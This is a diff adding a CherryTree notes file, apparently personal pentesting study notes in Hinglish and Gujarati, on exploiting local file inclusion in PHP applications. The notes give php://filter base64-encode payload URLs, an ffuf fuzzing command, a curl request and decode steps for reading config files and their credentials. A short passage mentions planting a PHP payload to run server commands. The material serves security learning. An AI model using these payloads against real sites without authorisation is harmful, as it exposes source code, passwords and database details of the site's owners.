@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="33" master_id="0" name="PHP filtering" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1751725283" ts_lastsave="1751726221">
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Kya problem hoti hai normal LFI me?</rich_text>
+    <rich_text>
+Agar tu </rich_text>
+    <rich_text family="monospace">?language=config</rich_text>
+    <rich_text> jaise URL se koi </rich_text>
+    <rich_text family="monospace">.php</rich_text>
+    <rich_text> file include karta hai to:
+• PHP uss file ko </rich_text>
+    <rich_text weight="heavy">execute</rich_text>
+    <rich_text> kar deta hai
+
+• Tu </rich_text>
+    <rich_text weight="heavy">source code nahi dekh pata</rich_text>
+    <rich_text>, sirf output milta hai (ya blank agar kuch render na ho)
+
+
+</rich_text>
+    <rich_text weight="heavy">Lekin</rich_text>
+    <rich_text> source code dekhna bahut important hota hai:
+◇ Passwords, database details, hidden features, file names — sab mil sakta hai source code me
+
+
+aa vastu ma mai ee vastu samji ke apde ek php no command run karaviye chhe je url thi php file apde server ma banaviye chhe ane ee file mai apde apdo payod add kari ne php file ne url thi server na command run karavi sakiye ha barober mai aa vastu chhe
+
+ana pachi apde fuzzing karsu ke server ma apde php file ne fuzz karsu jethi php na command apde run kari sakiye sayad tak aaa vastu samjvani 
+
+
+</rich_text>
+    <codebox char_offset="388" justification="left" frame_width="607" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="1"> PHP Filter wrapper ka use
+Tu LFI payload me php://filter use karke PHP code ko execute karne ke bajay base64 encode karwa sakta hai, fir use decode karke pure source code dekh sakta hai.
+
+📌 Format:
+
+php://filter/read=convert.base64-encode/resource=&lt;filename&gt;
+📍 Example:
+http://site.com/index.php?language=php://filter/read=convert.base64-encode/resource=config
+Agar application automatically .php append karta hai, to config ka matlab config.php hi banega ✅
+🛠 Output decode kaise karein?
+Jab tu upar wala URL access karega, to ek long base64 encoded string milegi.
+
+Usko decode karne ke liye terminal me:
+
+echo 'PD9waHAK...base64 string...KICB9Ciov' | base64 -d
+Yeh command tujhe actual source code dikhayegi.
+
+</codebox>
+    <codebox char_offset="787" justification="left" frame_width="607" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="1">🔁 Fuzzing se aur PHP files dhoondh
+Jaise:
+
+ffuf -w /path/to/wordlist.txt -u http://site.com/FUZZ.php
+
+Aur fir har milne wali file pe yeh payload try kar:
+
+?language=php://filter/read=convert.base64-encode/resource=FILENAME
+🧪 Test karne ke liye:
+
+
+curl "http://site.com/index.php?language=php://filter/read=convert.base64-encode/resource=index"
+Yeh tujhe base64 output dega jo tu decode kar sakta hai:
+
+echo "&lt;base64_output&gt;" | base64 -d</codebox>
+  </node>
+</cherrytree>
